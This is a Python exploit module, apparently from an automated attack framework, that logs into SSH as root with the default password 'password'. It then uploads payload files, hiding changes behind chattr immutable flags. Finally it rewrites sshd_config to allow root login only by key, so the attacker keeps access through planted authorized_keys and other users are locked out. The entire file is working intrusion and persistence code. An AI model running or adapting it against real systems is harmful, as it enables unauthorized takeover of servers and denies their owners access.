#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.ssh import ssh
from ..payloads.basicpayload import BasicPayload
from ..utils import logging

class SSHDefaultPassword(Module):
    """Exploits the ssh default passwords (Primary Module)"""

    payload = BasicPayload() # No payload required

    def detect(self, target):
        """Try to connect with the default credentials"""
        try:
            s = ssh(host=target['ip'], user="root", password="password",
                    timeout=0.25)
            return s
        except:
            logging.failure(target, "Default creds not working.")
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # detect_val should be ssh shell we used to test for compromise
        # Saves an open socket

        try:
            for i in self.payload.files.keys():
                detect_val.shell("chattr -i %s" % self.payload.files[i])
                try:
                    detect_val.upload_file(i, self.payload.files[i])
                except:
                    logging.failure(target, "Unable to upload %s to %s" %
                                    (i, self.payload.files[i])
                                    )
                detect_val.shell("chattr +i %s" % self.payload.files[i])
            for i in self.payload.steps():
                if type(i) == float:
                    time.sleep(i)
                else:
                    detect_val.shell(i)

            # Fix the problem after persistence
            # We are relying on the hope that we overwrote the authorized_keys
            # with our own
            detect_val.shell("chattr -i /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/#PermitRootLogin yes/PermitRootLogin "
                             "without-password/g' /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/PermitRootLogin yes/PermitRootLogin "
                             "without-password/g' /etc/ssh/sshd_config")
            detect_val.shell("sed -i 's/#PermitRootLogin without-password/"
                             "PermitRootLogin without-password/g' /etc/ssh"
                             "/sshd_config")
            detect_val.shell("chattr +i /etc/ssh/sshd_config")
            detect_val.shell("service sshd restart")
            time.sleep(0.25)

            detect_val.close()
            logging.success(target, "Default SSH credentials exploited.")
        except:
            import traceback
            traceback.print_exc()

        return True

